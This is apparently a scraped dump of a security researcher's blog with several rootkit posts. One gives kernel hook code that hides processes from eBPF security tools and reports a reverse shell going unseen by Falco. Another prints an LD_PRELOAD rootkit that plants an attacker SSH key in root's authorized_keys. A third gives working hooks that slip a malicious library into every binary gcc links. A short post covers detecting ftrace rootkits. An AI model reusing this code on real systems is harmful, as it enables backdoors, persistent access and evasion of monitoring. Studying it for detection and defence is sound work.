(!orig_bpf_map_lookup_elem) return NULL; ret = orig_bpf_map_lookup_elem(map, key); // If the map uses PIDs as keys, filter hidden PIDs if (ret \u0026amp;\u0026amp; map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(pid_t)) { pid = *(pid_t *)key; if (is_child_of_hidden_process(pid)) { return NULL; // Pretend the entry doesn\u0026#39;t exist } } return ret; } Hooking bpf_map_update_elem:\nstatic notrace long hook_bpf_map_update_elem(struct bpf_map *map, void *key, void *value, u64 flags) { u32 *pid_key; if (!orig_bpf_map_update_elem) return -ENOSYS; // If this is a PID-keyed map, block updates for hidden PIDs if (map \u0026amp;\u0026amp; map-\u0026gt;key_size == sizeof(u32)) { pid_key = (u32 *)key; if (is_child_of_hidden_process((int)*pid_key)) { return 0; // Silently succeed without actually updating } } return orig_bpf_map_update_elem(map, key, value, flags); } How This Defeats Detection:\nSecurity tools that track process behavior using BPF maps will never see entries for our hidden processes. When they try to look up a hidden PID, the lookup returns NULL. When they try to store data about a hidden process, the update silently fails. The tool\u0026rsquo;s logic continues to work, but it operates on an incomplete view of reality.\nBlocking eBPF Program Execution For maximum stealth, we can also prevent eBPF programs from running when triggered by our hidden processes.\nHooking __bpf_prog_run:\nstatic notrace u32 hook_bpf_prog_run(const struct bpf_prog *prog, const void *ctx) { pid_t pid; if (!orig_bpf_prog_run) return 0; pid = current-\u0026gt;tgid; // Don\u0026#39;t execute eBPF programs for hidden processes if (is_child_of_hidden_process(pid)) { return 0; } return orig_bpf_prog_run(prog, ctx); } Hooking the bpf() syscall:\nstatic notrace asmlinkage long hook_bpf(const struct pt_regs *regs) { int cmd; pid_t pid; if (!orig_bpf) return -ENOSYS; cmd = (int)regs-\u0026gt;di; pid = current-\u0026gt;tgid; // Hidden processes can use bpf() normally // but we could log/block specific commands here if (is_child_of_hidden_process(pid)) { // Optional: block certain BPF commands } return orig_bpf(regs); } Real-World Bypass Results Proof-of-Concept video demonstrating these results:\nFalco Evasion Falco is one of the most popular eBPF-based runtime security tools. It monitors syscalls, file access, network connections, and process execution to detect threats.\nWhat Falco Should Detect:\nReverse shell creation Suspicious network connections Critical file read And common post-exploitation activity (process exec/spawn, outbound connections, and sensitive file access).\nBypass Results:\nWith our BPF hooks active:\nReverse Shell: Connected to attacker-controlled server on port 8081. Falco detected nothing. Process Execution: Spawned interactive bash shell. Falco detected nothing. File Modification: Modified and read /etc/passwd, /etc/shadow. Falco detected nothing. Network Activity: Established multiple TCP connections. Falco detected nothing. Privilege Escalation: Used rootkit\u0026rsquo;s signal-based privilege escalation (kill -59). Falco detected nothing. Why The Bypass Works:\nFalco\u0026rsquo;s eBPF programs successfully attach to syscall tracepoints and execute as designed. However, every event they generate passes through kernel→userspace delivery (ring buffer / perf buffer, depending on driver/version), which we can disrupt via hooked kernel functions. Events from hidden processes are filtered before reaching Falco\u0026rsquo;s userspace agent. From Falco\u0026rsquo;s perspective, the system appears normal.\nTracee Evasion Tracee provides detailed system call tracing and event analysis. It\u0026rsquo;s designed to detect anomalous behavior and hidden processes.\nWhat Tracee Should Detect:\nHidden processes Kernel module loading Syscall anomalies And common attacker workflows (process hiding and suspicious network behavior).\nBypass Results:\nWith our BPF hooks active:\nProcess Enumeration: Tracee\u0026rsquo;s process listing showed no hidden processes Syscall Tracing: No syscalls from hidden processes appeared in traces Network Connections: Hidden network connections invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nBPF Iterators Can Be Filtered: Tools like GhostScan and Decloaker that enumerate kernel objects can be defeated by hooking bpf_iter_run_prog()\nRingbuffers Can Be Intercepted: Falco and Tracee\u0026rsquo;s event streams can be selectively filtered by hooking ringbuffer operations\nPerf Events Can Be Blocked: Legacy monitoring tools using perf events are equally vulnerable\nBPF Maps Can Be Manipulated: Security tools that track state in BPF maps can operate on incomplete data\nFtrace Enables Invisible Hooks: Hooking via ftrace allows interception without modifying kernel code or using obvious techniques like syscall table hooking\nTechnical Achievements:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques. The fundamental truth remains: the moment an attacker controls the kernel, they control reality as the system sees it.\nThe only winning move is not to let them get there.\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that’s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren’t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); 